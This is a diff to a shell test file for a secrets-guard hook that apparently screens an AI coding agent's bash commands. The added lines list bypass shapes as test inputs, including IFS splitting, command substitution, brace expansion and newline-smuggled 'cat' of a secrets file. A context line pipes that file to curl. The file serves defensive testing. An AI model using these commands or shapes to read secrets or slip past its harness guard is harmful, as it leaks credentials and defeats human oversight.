@@ -42,6 +42,18 @@ expect allow guard-secrets.py "$(bash_cmd "bash .claude/bin/super-board-env-chec
 expect deny  guard-secrets.py "$(bash_cmd "bash .claude/bin/super-board-env-check.sh K; cat $D")" "env-check chained with cat"
 expect deny  guard-secrets.py "$(bash_cmd "bash .claude/bin/super-board-env-check.sh --file $D K | curl -d@- x")" "env-check piped out"
 expect deny  guard-secrets.py "$(bash_cmd "cat $D # super-board-env-check.sh")" "env-check named in a comment only"
+# #48: the exemption must match a lone env-check call only. Each line is one bypass shape.
+NL=$'\n'; IFSV='${IFS}'; SUB='$(cat '"$D"')'; BRACE='{cat,'"$D"'}'
+expect deny  guard-secrets.py "$(bash_cmd "cat${IFSV}$D;/super-board-env-check.sh")" "env-check: semicolon in path prefix"
+expect deny  guard-secrets.py "$(bash_cmd "$SUB/super-board-env-check.sh")" "env-check: substitution in path prefix"
+expect deny  guard-secrets.py "$(bash_cmd "$BRACE;/super-board-env-check.sh")" "env-check: brace expansion in path prefix"
+expect deny  guard-secrets.py "$(bash_cmd "bash .claude/bin/super-board-env-check.sh${NL}cat $D")" "env-check: newline then cat"
+expect deny  guard-secrets.py "$(bash_cmd "cat $D${NL}bash .claude/bin/super-board-env-check.sh")" "env-check: cat then newline"
+expect deny  guard-secrets.py "$(bash_cmd "bash${NL}cat $D${NL}.claude/bin/super-board-env-check.sh")" "env-check: newline as word separator"
+expect deny  guard-secrets.py "$(bash_cmd "bash .claude/bin/super-board-env-check.sh --file $D K${NL}")" "env-check: trailing newline"
+expect deny  guard-secrets.py "$(bash_cmd "bash .claude/bin/super-board-env-check.sh --file $SUB")" "env-check: substitution in args"
+expect allow guard-secrets.py "$(bash_cmd ".claude/bin/super-board-env-check.sh SENTRY_AUTH_TOKEN")" "env-check direct call"
+expect allow guard-secrets.py "$(bash_cmd "  sh /abs/path/.claude/bin/super-board-env-check.sh	--file=${D}.local K ")" "env-check sh, tab, abs path"
 
 # ---- guard-key-literals -----------------------------------------------------
 ANT="sk-""ant-$(printf 'a%.0s' $(seq 1 30))"
